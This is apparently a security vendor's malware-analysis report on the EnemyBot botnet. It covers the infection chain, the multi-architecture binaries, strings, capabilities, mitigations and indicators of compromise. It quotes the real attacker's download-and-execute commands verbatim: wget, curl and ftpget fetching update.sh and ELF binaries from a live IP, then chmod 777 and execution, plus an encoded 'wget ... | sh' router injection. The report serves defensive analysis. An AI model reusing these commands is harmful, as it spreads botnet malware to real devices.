At first glance and by analyzing\nthe initial infection, it appears to cover a wide range of devices and platforms. This report covers technical\ndetails including its origin and functionality.\n\n### Initial Infection\n\n|echo;cd /tmp || cd /home/$USER || cd /var/run || cd /mnt || cd /data || cd /root || cd /; wget\nhttp://198.12.116.254/update.sh -O update.sh; busybox wget http://198.12.116.254/update.sh -O update.sh;\ncurl http://198.12.116.254/update.sh -O update.sh; chm\n\nThe initial infection was identified making a drive-by attempt to /shell at a web server with an interesting\npayload attached to the “value” string. We saw several attempts to download an “update.sh” file using different\nmethods: wget, busybox, and curl.\n\nTaking a closer look at the update.sh script, the malware attempts to download 13 different ELF binaries each\ncompiled for different system architectures. The appended architecture type is appended to the end of the\nname “enemybot”. Given the wide range of supported architectures, at first glance this botnet should be\neffective against Linux-based hosts ranging from servers to IoT devices.\n\nenemybotmips\nenemybotmpsl\nenemybotsh4\nenemybotx86\nenemybotarm7\nenemyboti686\nenemybotppc\nenemyboti586\nenemybotm68k\nenemybotspc\nenemybotarm\n\n\n-----\n\nenemybotarm5\nenemybotppc-440fp\n\nEach line of the script attempts to download (again using various methods), set permissions to execute (777),\nexecute from /tmp/ and then delete the original ELF binary.\n\nwget http://198.12.116.254/folder/enemybotx86 -o enemybotx86; busybox wget\nhttp://198.12.116.254/folder/enemybotx86 -o enemybotx86; curl http://198.12.116.254/folder/enemybotx86 -o\nenemybotx86; busybox curl http://198.12.116.254/folder/enemybotx86 -o enemybotx86; ftpget -v -u\nanonymous -p anonymous -P 21 198.12.116.254 enemybotx86 enemybotx86; busybox ftpget -v -u anonymous\n-p anonymous -P 21 198.12.116.254 enemybotx86 enemybotx86; chmod 777 enemybotx86; ./enemybotx86;\nrm -rf enemybotx86\n\n### Stage 2 – Pulling Back the Curtain\n\nFirst, we’ll take a look at the “enemybotx86” file that is the system architecture that we’re working on as it\nwould land us the most success when executing it in a sandbox.\n\nAccording to exiftool, the file is indeed a binary executable file in the ELF format (Linux executable).\n\nJust to get a general idea as to what this binary might be doing, we’ll run it against strings and look for\nanything interesting. The word “enemy” appears to pop up again and again, and in one case is hex formatted:\n\n\n-----\n\nSome other noteworthy and rather curious strings include:\n\n/Game/Mods/TheCenter/TheCenter_A1_NearB\n/Game/Maps/TheIslandSubMaps/MasterIBLCaptures\n/Game/Maps/TheIslandSubMaps/E3_Far_WIP\necho -e “\\x65\\x6e\\x65\\x6d\\x79”\ncmac=12%%3Aaf%%3Aaa%%3Abb%%3Acc%%3Add&submit_button=status_guestnet.asp%%0A\nwget+http%%3A%%2F%%2F198.12.116.254%%2Fupdate.sh+-O+%%7C+sh%%0Aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%%10%%A6G%%00&cip=192.168.100.1\nDetermined we already have a instance running on this system!\nBinded and listening on address %d.%d.%d.%d\ndecodedshit\nwatudoinglookingatdis\n\nLooking for function names, one that stood out was “whatudoinglookingatdis”. Maybe a hello to future\nresearchers?\n\nScrubbing the file in a decompile, it appears to feature a host of networking options such as port scanners,\nTCP/UDP flood options and general system enumeration. Much of the code appears to be encrypted and we\nencountered some counter forensics which can make static analysis problematic.\n\n\n-----\n\nThe EnemyBot malware also appears to have the ability to steal data via HTTP POST, which in our case, the\nmalware was sending the data back to the original IP address.\n\nJust by looking at the export names, we definitely get a better understanding as to what this particular botnet is\ncapable of.\n\nUpon further analysis, we find some interesting flags which appear to be passed in as arguments. Some of\nthese include Destination IP, Source IP, Destination Port, Source Port, Data Payload, and Packet Count.\n\nThe malware also initiates system checks to determine whether or not the malware is already running. After\nthe instance starts there are two possible outputs:\n\n“Determined we already have a instance running…”\n“Binded and listen on address %d.%d.%d.%d.\\n”\n\n\n-----\n\n**Dynamic Analysis of the EnemyBot malware did not provide anything useful as the malware seems to have**\nkilled itself soon after execution. There appear to be some baked-in counter forensics that kill the application\nbased on certain detected process names.\n\n## Conclusion\n\nThe EnemyBot malware appears to follow similar structures and patterns we’ve seen with other common\n[botnets, with a few changes. There appears to be strong correlation to that of the LolFMe botnet which](http://blog.nsfocus.net/keksec-lolfme/)\ncontains other similar strings such as “watudoinglookingatdis”. The LolFMe botnet was quite short-lived and\nwas never popular so it will be interesting to see how far off the ground this particular strain takes us.\n\nBoth LolFMe and Mirai botnets leverage multi-architecture support and RCE as the initial foothold. This was\nalso the case for EnemyBot.\n\n## Mitigation – Securonix Recommendations\n\nSome possible actions are recommended that can potentially help proactively mitigate the impact of the\nEnemyBot attacks on your network.\n\n\n-----\n\nEnsure systems are fully patched and not vulnerable to RCE\nPatch IoT devices’ firmware to the latest versions to mitigate external exploitation\nEmploy the usage of layer-7 network monitoring and detection to detect common exploits that may\nleverage RCE\nEnsure that externally exposed network segments are isolated from internal hosts\nDisable or limit execution from linux /tmp/ directories\n\n## Detection and Indicators of Compromise (IoCs):\n\nFile Name sha256\n\nupdate.sh cc36cc84d575e953359d82e8716c37ba2cbf20c6d63727ca9e83b53493509723\n\nenemybotarm 52421da5ee839c9bde689312ff35f10e9bcab7edccc12ee1fe16630e20531aaf\nadb51a8d112590a6fdd02ac8d812b837bbe0fcdd762dba6bbba0bd0b538f9aef\n\nenemybotarm5 498ecf2ce03960a695d4ba92d4d2e6163917686db29393c4b8d8c9d11d19774d\n5e56210f15b653e4ea881f25bfa423af4f4c5ee3a7c9386543fde23e0e7169c8\n\nenemybotarm7 7ccffe7a3daa58db665db93f816ab0b5a4e9ce0bc7a2490d885250d267ed4bbc\n7635758818ca966288ad10fb3d385c177f8cd5554369eeb28f8b52951004ed89\n\nenemyboti586 f3c4ca5ba23d27a4d297dfef8614b48bbaca6455814d537114f4e6d418f10f47\nd9204c9b5018a3028d5c7f966d8c37be9d7d4dd2c5c4cd95cde686cce655c609\n\nenemyboti686 ae9cc1b644ee435bddc57af2eeab05fb0ba0dc2f81473611bd2f39c1d9be1d1c\nd0b9e7bbf034e501872ecb276b3b670ae175fff09618d9836356d47f677bdbbc\n\nenemybotm68k 5dba7e81c4a03eedee4a33535cfda88d8d178658d0e434ee48bd29d7091c63b5\ne4bdf0d87db133824ff183c28c860c08794394eaaf76898899cbeb5f9749ae1f\n\nenemybotmips 22db83f9cc631eb3222444328289a3be787c3a8182ccd8004c6cc2b5dc50a12d\naeb9f6999fdc3a3dadbe93ff8a1a2de3ac181b43eddcf208c018db88526b5314\n\nenemybotmpsl c275a1ec95142b7134d7beb153e6126bda9087c152e69497f1990c39d5045399\n6dbb0e96180d0946ddd9ff17908cf830fbff5016ff013891e3fdf3c3b33ef2e6\n\nenemybotppc ea2ff0c01629bdaecceecc59d93de73f01b7b18146986be114503c086fa29976\n7ec1fab277b86e022819c9b5a53be05df2af76c5c19b2aa1cf26590d06dcdbcd\n\nenemybotppc-440fp 908a95c887d4c46e5058db09e85efba023219793b54b5cd7ea03e1b450784111\na33145dc629c7ca76dc5ec0138fe60b06e8c53bd01f1bb90d9a7e21ff0a391e6\n\nenemybotsh4 9bb46cfa321d5aa65960fa4563a50eec40de4e221e360162bae4b4e4b40a3540\n058d36172d25e7b3db227c02ffba5be3d1b17d0eef7bfd4029c55b16ac2ab06b\n\nenemybotspc f36ade94ba4261fdff37d53c7d7c4935374d9263ec4fe92d2bb6c1def5f0783f\nb2c92609557eaabe108689a17996befeabb48da70053ae6335a1fcd0c1189249\n\n\n-----\n\nenemybotx86 1a7316d9bb8449cf93a19925c470cc4dbfd95a99c03b10f4038bb2a517d6ed50\n12e907fae4427a7b0d68adfb33a5e045971bd755f8b7a48299a27736c24c9929\n\n### IP Communication observed:\n\n198.12.116.254\n\nPlease look out for updates on search queries and detection content from Securonix Threat Labs\n\nWe also invite you to send your questions regarding any security advisories to the Securonix Critical\nIntelligence Advisory team and look forward to being of assistance.\n\n\n-----",
